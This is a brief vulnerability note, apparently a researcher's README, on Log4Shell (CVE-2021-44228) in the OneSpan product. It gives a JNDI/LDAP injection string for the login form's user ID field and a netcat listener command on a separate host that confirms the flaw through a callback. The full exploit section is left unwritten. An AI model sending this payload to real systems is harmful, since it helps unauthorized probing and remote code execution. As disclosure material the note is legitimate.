# Log4Shell, again...

OneSpan is listed as a product affected by CVE-2021-44228, cf. https://www.onespan.com/remote-code-execution-vulnerability-in-log4j2-cve-2021-44228 .

The vulnerability can be exploited from the login form (example.com/viewLogin.action), by injecting a crafted input in the loginUserID field and submitting the form. Running netcat on a different host will confirm the vulnerability (nc -lnvp <somePort>).

## Initial payload
${jndi:ldap://host-with-netcat:9999}

Netcat will output a "Connection received on <target-ip>".

## Exploit
... to be written some day if I have time...
